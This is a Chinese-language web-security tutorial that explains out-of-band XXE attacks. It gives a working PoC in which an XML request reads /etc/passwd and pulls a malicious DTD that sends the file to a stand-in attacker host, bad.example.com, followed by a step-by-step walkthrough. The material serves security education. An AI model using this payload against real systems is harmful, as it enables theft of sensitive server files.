---
title: OOB XXE
date: 2026-04-26
summary: 带外 XML 外部实体 (OOB XXE) 漏洞是 XXE 漏洞的一种，攻击者不会立即收到对 XXE 负载的响应。 攻击是使用一个通道（例如直接 HTTP 请求）进行的，而结果（例如敏感文件）是通过另一个通道（通常是由攻击者控制的 HTTP
tags: 漏洞库, Web安全, XXE
cover: app-yellow
readingTime: 6 分钟
featured: false
---
# OOB XXE

### 什么是OOB XXE

带外 XML 外部实体 (OOB XXE) 漏洞是 XXE 漏洞的一种，攻击者不会立即收到对 XXE 负载的响应。 攻击是使用一个通道（例如直接 HTTP 请求）进行的，而结果（例如敏感文件）是通过另一个通道（通常是由攻击者控制的 HTTP 服务器）接收的。

由于缺乏直接响应，OOB XXE 有时会与盲 XXE 混淆，但对于盲 XXE，攻击者根本不会收到任何响应，而是根据目标应用程序的行为逐步重建敏感数据， 例如它生成的 Web 服务器和 XML 解析器错误。

利用带外 XXE 漏洞的过程与使用带内 XXE 参数实体类似。 攻击者创建一个外部 DTD（文档类型定义），然后受攻击的应用程序从攻击者控制的 HTTP 服务器下载该 DTD。

虽然带内 XXE 可用于对 Web 应用程序和 API 进行拒绝服务 (DoS) 和服务器端请求伪造 (SSRF) 攻击，但 OOB XXE 的主要目标是敏感数据泄露。

### OOB XXE 举例

以下是一个 PoC 示例，说明攻击者如何使用参数实体通过带外 (OOB) 技术窃取敏感数据：

Request:
```
POST http://example.com/xml HTTP/1.1
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM
  "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM
  "http://bad.example.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>
```

恶意 DTD (bad.example.com/evil.dtd)：

```
<!ENTITY % all "<!ENTITY send SYSTEM 'http://bad.example.com/?collect=%file;'>">
%all;
```

攻击过程如下：

1. XML 解析器首先解析%file 参数实体，加载文件/etc/passwd。

2. 接下来，XML解析器解析%dtd参数实体，并发出请求以获取攻击者的DTD文件：http://bad.example.com/evil.dtd。

3. 解析器处理完攻击者的 DTD 文件后，%all 参数实体会创建一个名为 &send 的通用实体，其中包含 URL。 此 URL 使用 %file 参数实体，该实体已在步骤 1 中解析，现在保存本地文件的内容。 在本例中，这是 Linux /etc/passwd 文件的内容。

4. 最后，在构造 URL 后，XML 解析器处理 &send XML 实体，从而向攻击者的服务器发送请求。

5. 攻击者可以在自己的一端记录请求并根据日志条目重建文件。

请注意，由于 URL 格式限制，此特定攻击并非旨在将二进制文件发送到攻击者的服务器。 但是，您可以使用 PHP 包装器等技术来使用 Base64 对文件进行编码，从而解决这些限制。
